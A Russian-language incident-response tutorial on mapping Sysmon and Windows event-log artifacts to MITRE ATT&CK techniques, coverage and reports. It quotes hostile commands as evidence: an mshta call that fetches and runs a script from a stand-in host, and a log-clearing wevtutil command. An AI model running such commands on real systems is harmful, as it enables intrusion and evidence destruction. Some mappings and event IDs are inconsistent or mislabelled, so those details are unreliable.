## Вопрос, с которого всё начинается

Расследование инцидента подходит к концу: собраны артефакты с диска, логов и сети. Но отчёт из разрозненных находок («вот событие Sysmon, вот задача в планировщике, вот дамп памяти») читается тяжело, и в нём трудно увидеть **общую картину атаки**. Как разложить находки так, чтобы они сложились в понятную историю?

Помогает **MITRE ATT&CK** — общепринятый каталог приёмов атакующих. Разберём, как сопоставить наши артефакты с ним на одном инциденте.

## Наш пример: набор артефактов инцидента

Прежде чем что-то сопоставлять, разберёмся с самим ATT&CK. Это база знаний, разделённая на два уровня:

- **Тактика** — «зачем» атакующий делает шаг (например, *Execution* — выполнить код, *Persistence* — закрепиться).
- **Техника** — «как» именно он это делает. У каждой техники есть ID вида `T1059`.

Техники группируются в субтехники: `T1059.001` — конкретно PowerShell. Всё вместе даёт язык, на котором расследования разных людей становятся сравнимыми.

## Шаг 1: первая находка — выполнение

У нас есть событие Sysmon с ID 1 (запуск процесса), где виден вызов `mshta`:

```bash
$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==1 and (.Event.EventData.Image|test("mshta"))) | .Event.EventData.CommandLine'
mshta http://evil.tld/x.hta
```

`mshta` — это системная утилита Windows, которую можно заставить выполнить чужой скрипт. Атакующие любят такие «легитимные» программы (их называют LOLBins), потому что антивирус им доверяет. По ATT&CK это техника **T1218.005 (Mshta)**, тактика **Execution** (выполнение). Мы сопоставили первую находку.

## Шаг 2: закрепление — планировщик задач

Дальше в логе планировщика задач видим создание задачи с подозрительным именем:

```bash
$ evtx_dump -o json 'TaskScheduler%4Operational.evtx' | jq 'select(.Event.System.EventID==106)'
Updater
```

Событие 106 — регистрация новой задачи. Это **T1053.005 (Scheduled Task)**, тактика **Persistence**: задача будет запускаться снова и снова, обеспечивая возврат.

## Шаг 3: кража учётных данных

В том же Sysmon есть событие 10 (доступ к процессу), где целью выступает `lsass.exe`:

```bash
$ evtx_dump -o json Sysmon.evtx | jq 'select(.Event.System.EventID==10 and (.Event.EventData.TargetImage|test("lsass")))'
```

`lsass.exe` — системный процесс, в памяти которого Windows хранит учётные данные. Обращение к нему — попытка их украсть. Это **T1003.001 (LSASS Memory)**, тактика **Credential Access**.

## Шаг 4: заметание следов

И наконец — событие 1102 в журнале Security, означающее, что журнал был очищен:

```bash
$ evtx_dump -o json Security.evtx | jq 'select(.Event.System.EventID==1102)'
```

Удаление журнала — **T1070.001 (Clear Windows Event Logs)**, тактика **Defense Evasion**. Обратите внимание: само это событие — улика. Атакующий хотел скрыть следы, а оставил след.

## Шаг 5: выстраиваем цепочку

Отдельные техники обретают смысл, когда выстроены по порядку тактик. Записываем в отчёт так:

```
[Execution]        T1218.005 — mshta (Sysmon 1, cmdline "mshta http://evil.tld/x.hta")
[Persistence]      T1053.005 — Scheduled Task "Updater" (EVTX 106)
[Credential Access]T1003.001 — доступ к lsass (Sysmon 10)
[Defense Evasion]  T1070.001 — очистка Security-журнала (EVTX 1102)
```

Такая запись воспроизводима: для каждой техники указан **конкретный артефакт-доказательство**. Читатель видит и вывод, и на чём он основан.

## Шаг 6: покрытие и детекты

ATT&CK полезен не только для отчёта. Инструмент **ATT&CK Navigator** визуализирует **покрытие**: какие техники вы *видите* (есть источник данных, например Sysmon) и какие *детектируете* (есть правило). Пробелы — это подсказка, какие логи включить.

| Вопрос | Что проверяем |
|--------|---------------|
| Видим ли технику? | есть ли источник (Sysmon, auditd)? |
| Детектируем ли? | есть ли правило (Sigma)? |
| Покрытие | доля техник с источником и правилом |

Тот же маппинг — основа **threat hunting**: если атакующий использует T1053.005, то в логе планировщика должно быть событие 106 с подозрительной командой. Строим гипотезу и проверяем её.

## Как это помогает охотиться за угрозами

ATT&CK не только описывает прошедшее — он задаёт **гипотезы** для поиска. Если известна техника атакующего, можно предсказать, какой артефакт она оставляет, и проверить его. Например, техника T1053.005 (Scheduled Task) должна оставить событие 106 в логе планировщика:

```bash
$ evtx_dump -o json 'TaskScheduler%4Operational.evtx' | jq 'select(.Event.System.EventID==106)'
```

Так «охота» превращается из разового поиска сигнатуры в систематическую проверку гипотез по каждому источнику. А визуализация покрытия в ATT&CK Navigator показывает, каких источников логов не хватает, — и подсказывает, что включить до следующего инцидента.

## Полный разбор: цепочка ATT&CK по артефактам

Соберём наш инцидент в сквозную историю — от первого артефакта к покрытию детектами.

| Артефакт | Техника ATT&CK | ID | Детект |
|----------|----------------|----|--------|
| Prefetch `powershell.exe -enc` | Command and Scripting Interpreter | T1059.001 | Sysmon 1 |
| Scheduled Task создана | Scheduled Task/Job | T1053.005 | Security 4698 |
| LSASS-доступ | OS Credential Dumping | T1003.001 | Sysmon 10 |
| `wevtutil cl Security` | Indicator Removal | T1070.001 | Security 1102 |
| Исходящий на :8443 | Exfiltration Over C2 | T1041 | Flow/IDS |

Читаем таблицу по вертикали: сверху вниз выстраивается **kill chain** — выполнение → закрепление → кража учёток → заметание следов → вывод данных. Теперь вы не просто «нашли подозрительный процесс», а показали, на каком этапе атаки находится злоумышленник.

## Частые вопросы

**Обязательно ли определять тактику для каждого артефакта?** Нет. Ценность в **цепочке**: отдельная техника ничего не говорит, а последовательность показывает замысел.

**Что делать, если техника не определяется однозначно?** Ставьте наиболее вероятную и помечайте уверенность (high/medium/low). Лучше честная догадка, чем пропуск.

**Как использовать ATT&CK для защиты?** Строят **матрицу покрытия**: напротив каждой техники — есть ли детект. Пустые клетки = слепые зоны, куда идёт приоритет.

**Чем ATT&CK отличается от kill chain?** Kill chain — линейные фазы, ATT&CK — каталог техник с тактиками; они дополняют друг друга.

## Как превратить маппинг в отчёт

Структура отчёта, понятная и аналитику, и руководству:

1. **Сводка:** что произошло, какая техника стартовая (Initial Access/Execution).
2. **Таймлайн:** артефакт → техника → время.
3. **Влияние:** какие данные/системы затронуты (Impact).
4. **Детекты:** что сработало, что нет, что добавить.

Маппинг на ATT&CK делает отчёт универсальным языком: коллеги из SOC, IR и руководство понимают одни и те же обозначения.

## Что мы теперь знаем

- ATT&CK разделяет **тактики** (зачем) и **техники** (как); у техник есть ID (`T1059.001`).
- Каждую находку сопоставляют с техникой по её артефакту: `mshta` → T1218.005.
- В отчёте для каждого шага указывают тактику, технику, ID и артефакт-доказательство.
- Цепочка техник по порядку тактик складывается в историю атаки.
- ATT&CK Navigator показывает **покрытие** и пробелы (какие логи добавить).
- Маппинг — это **интерпретация** доказательств, а не их замена: техника без артефакта недоказуема.
